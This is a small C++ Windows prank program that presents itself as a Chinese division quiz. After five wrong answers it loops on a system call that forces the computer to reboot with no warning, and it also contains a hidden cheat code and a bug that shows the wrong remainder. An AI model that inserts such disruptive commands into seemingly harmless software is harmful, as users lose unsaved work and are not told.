#include<bits/stdc++.h>
#include<windows.h>
using namespace std;
int main() {
	bool hry=true;
	int a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,ct0=0,ct1=0,ct2=0,ct3=0,ct4=0,ct5=0,ct6=0,ct7=0,ct8=0,round=0;
   	printf("欢迎来到李明喆除法小课堂\n");
	printf("想跳过这部分吗？\n不存在的，随便输个数代表你的智商吧\n");
	scanf("%d",&d);
	system("cls");
	if(d==160419&&hry==true){
		printf("作弊的小子\n");
		printf("你跳过了除法部分\n\n");
		Sleep(1500);system("cls");
	}
	for(f=0;f<5&&(d!=160419||hry==false);){
		if(ct3>=5){
			for(int fff=0;;fff++){
				system("shutdown -r -t 3");
				cout<<"信仰圣光吧！！！";
			}
		}
		srand(time(0));
		d=(int)(100.0*rand()/RAND_MAX*1999+1.0);
		h=(int)(150.0*rand()/RAND_MAX+1.0);
		k=(int)(60.0*rand()/RAND_MAX+1.0);
		c=(int)h/k;
		j=h%k;
		printf(" %d / %d =（商）",h,k);
		scanf("%d",&a);
		printf("余数：");
		scanf("%d",&t);
		if(a==c&&t==j){
			printf("对了哟^_^\n");
			f++;
		}
		else{
			ct3=ct3+1;
			printf("错！正确的商是%d，余数是%d，滚去学习吧(╯‵□′)╯︵┴─┴\n", c,h);
		}
		if(f==3){
			printf("最后两道题！\n");
		}
		else if(f==4){
			printf("最后一道题！\n");
		}
		else if(f==5){
			printf("你成功了！⊙ω⊙");
		}
		else{
			continue;
		}
	}
	return 0;
}
